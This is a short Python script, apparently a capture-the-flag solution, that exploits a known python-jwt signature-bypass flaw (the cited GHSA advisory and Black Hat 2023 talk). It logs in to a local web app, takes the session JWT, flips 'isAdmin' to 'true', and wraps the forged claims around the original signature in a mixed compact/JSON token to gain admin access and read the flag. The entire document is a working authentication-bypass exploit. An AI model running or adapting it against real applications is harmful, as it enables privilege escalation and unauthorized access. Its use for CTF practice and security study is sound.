import re
import requests
import json
from base64 import b64decode, b64encode
from jwcrypto.common import json_encode

# https://github.com/onhexgroup/Conferences/blob/main/Black%20Hat%20USA%202023%20slides/Tom%20Tervoort_Three%20New%20Attacks%20Against%20JSON%20Web%20Tokens.pdf
# https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp
# https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9
login_data = {"username": "dayt0n", "password": "asdf"}
url = "http://127.0.0.1:1337"

s = requests.Session()
s.post(f"{url}/register", json=login_data)
s.post(f"{url}/login", json=login_data)

cookie = s.cookies.get_dict()["session"]
protected, payload, sig = cookie.split(".")
evil_data = json.loads(b64decode(payload + "==").decode())
evil_data["isAdmin"] = "true"
# encode evil header as base64, adding padding
evil_header = b64encode(json_encode({"alg": "ES384"}).encode()).decode() + "="
not_compact = {
    evil_header: f".{b64encode(json_encode(evil_data).encode()).decode()}.",
    "protected": protected,
    "payload": payload,
    "signature": sig,
}
# reset cookie to new value
s.cookies.set("session", None)
s.cookies.set("session", json_encode(not_compact))
print(json_encode(not_compact))

r = s.get(url)
flag = re.search(r"<code>(.*?)</code>", r.text)

if not flag:
    print("no flag found")
else:
    print(f"flag: {flag.group(1)}")